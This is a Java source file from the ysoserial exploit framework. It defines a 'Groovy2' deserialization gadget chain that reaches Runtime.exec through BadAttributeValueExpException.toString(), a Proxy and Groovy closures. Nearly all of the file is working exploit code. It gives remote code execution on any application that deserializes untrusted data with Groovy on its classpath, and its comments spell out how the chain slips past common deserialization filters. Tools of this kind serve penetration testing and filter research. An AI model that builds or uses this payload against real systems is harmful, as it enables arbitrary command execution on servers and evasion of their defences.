package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;

import javax.management.BadAttributeValueExpException;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import sun.misc.Unsafe;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;

/*
	Groovy via BadAttributeValueExpException + toString() trigger.
	No HashMap, no PriorityQueue, no AnnotationInvocationHandler, no TemplatesImpl.

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				val.toString()
					Proxy(ConvertedClosure).toString()
						ConvertedClosure.invoke("toString")
							MethodClosure(command, "execute").call()
								command.execute()
									Runtime.exec(command)

	Filter evasion:
		1. BadAttributeValueExpException entry — rarely filtered (JMX class)
		2. No HashMap/HashSet/PriorityQueue/Hashtable
		3. No AnnotationInvocationHandler
		4. No commons-collections or commons-beanutils
		5. No TemplatesImpl — Groovy's String.execute() calls Runtime.exec()

	Key insight: toString() has ZERO args. ConvertedClosure("toString") delegates
	to MethodClosure.call() with no args, which matches Groovy's
	String.execute() (also zero args). This avoids the arg-count mismatch
	that would break compare()-based triggers (which pass 2 args).

	Differs from Groovy1:
		- Groovy1: HashMap → AIH → Proxy(Map) → ConvertedClosure("entrySet")
		- Groovy2: BAVE → Proxy(Serializable) → ConvertedClosure("toString")
		  Completely different entry point and trigger mechanism.

	Requires:
		groovy 2.3+
		JDK >= 8u76 (BAVE.readObject() calls toString())
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({ Authors.DMBS335 })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class Groovy2 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		// ConvertedClosure intercepts "toString" method on the Proxy
		// and delegates to MethodClosure(command, "execute")
		// toString() has NO args → call() with no args → String.execute() matches
		final ConvertedClosure closure = new ConvertedClosure(
			new MethodClosure(command, "execute"), "toString");

		// Proxy that implements Serializable — toString() is dispatched to handler
		// (Java Proxy spec: hashCode, equals, toString are always dispatched)
		final Object proxy = Proxy.newProxyInstance(
			Groovy2.class.getClassLoader(),
			new Class[]{Serializable.class},
			closure);

		// BadAttributeValueExpException.readObject() calls val.toString()
		// when SecurityManager is null (which is always on modern JDK)
		// JDK 17+ changed val field type from Object to String — use Unsafe
		final BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
		final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		final Unsafe unsafe = (Unsafe) unsafeField.get(null);
		final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
		unsafe.putObject(bave, unsafe.objectFieldOffset(valField), proxy);

		return bave;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Groovy2.class, args);
	}
}
